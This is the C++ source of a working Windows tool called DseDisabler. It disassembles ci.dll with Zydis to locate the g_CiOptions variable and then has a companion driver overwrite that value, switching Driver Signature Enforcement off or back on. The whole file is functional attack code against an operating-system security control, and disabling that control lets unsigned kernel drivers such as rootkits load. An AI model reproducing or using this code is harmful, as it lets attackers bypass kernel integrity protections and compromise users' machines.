#include <Windows.h>
#include <cstdio>
#include <string>
#include <Zydis/Zydis.h>

ULONGLONG FindCipInitialize(ULONGLONG ciInitialize) {
    BYTE data[0x6D];
    memcpy(data, reinterpret_cast<LPCVOID>(ciInitialize), sizeof(data));

    ZyanUSize offset = 0;
    ZydisDisassembledInstruction instruction{};
    ULONGLONG lastCall = 0;

    while (ZYAN_SUCCESS(ZydisDisassembleIntel(ZYDIS_MACHINE_MODE_LONG_64, 0, data + offset, sizeof(data) - offset, &instruction))) {
        const ULONGLONG functionAddress = ciInitialize + offset;

        if (instruction.info.opcode == 0xE8) // Relative call
            lastCall = functionAddress + instruction.operands[0].imm.value.u + instruction.info.length;

        offset += instruction.info.length;
    }

    return lastCall;
}

ULONGLONG Findg_CiOptions(ULONGLONG cipInitialize) {
    BYTE data[0x6D];
    memcpy(data, reinterpret_cast<LPCVOID>(cipInitialize), sizeof(data));

    ZyanUSize offset = 0;
    ZydisDisassembledInstruction instruction{};

    while (ZYAN_SUCCESS(ZydisDisassembleIntel(ZYDIS_MACHINE_MODE_LONG_64, 0, data + offset, sizeof(data) - offset, &instruction))) {
        const ULONGLONG functionAddress = cipInitialize + offset;

        if (instruction.info.operand_count == 2 && instruction.operands[1].reg.value == ZYDIS_REGISTER_ECX) {
            if (instruction.operands[0].mem.base == ZYDIS_REGISTER_RIP) { // Rip relative addressing
                const LONGLONG disp = instruction.operands[0].mem.disp.value;
                return functionAddress + disp + instruction.info.length;
            }
        }

        offset += instruction.info.length;
    }

    return 0;
}

struct Request {
    ULONGLONG Offset;
    int NewValue;
};

int main(int argc, char* argv[]) {
    if (argc <= 1) {
        printf("Usage: DseDisabler.exe disable/enable\n");
        return 0;
    }

    int newValue;
    if (strcmp(argv[1], "disable") == 0)
        newValue = 8;
    else if (strcmp(argv[1], "enable") == 0)
        newValue = 6;
    else {
        printf("Usage: DseDisabler.exe disable/enable\n");
        return 0;
    }

    // Credits https://github.com/CaledoniaProject/FindCiOptions, I found the DONT_RESOLVE_DLL_REFERENCES flag there
    const HMODULE ciModule = LoadLibraryEx(R"(C:\Windows\System32\ci.dll)", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    const auto ciInitialize = reinterpret_cast<ULONGLONG>(GetProcAddress(ciModule, "CiInitialize"));
    const ULONGLONG cipInitialize = FindCipInitialize(ciInitialize);
    const ULONGLONG g_CiOptionsAddress = Findg_CiOptions(cipInitialize);
    const ULONGLONG offset = g_CiOptionsAddress - reinterpret_cast<ULONGLONG>(ciModule);
    printf("%p\n", offset);

    HANDLE driverHandle = CreateFile(R"(\\.\DseDisabler)", GENERIC_WRITE | GENERIC_READ, NULL, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (!driverHandle || driverHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error while opening driver handle\n");
        return 1;
    }

    Request request{};
    request.Offset = offset;
    request.NewValue = newValue;

    DWORD bytesRead = 0;
    if (!DeviceIoControl(driverHandle, 0x100, &request, sizeof(request), &request, sizeof(request), &bytesRead, nullptr)) {
        fprintf(stderr, "Error while communicating with the driver\n");
        return 1;
    }

    printf("Updated\n");
    return 0;
}
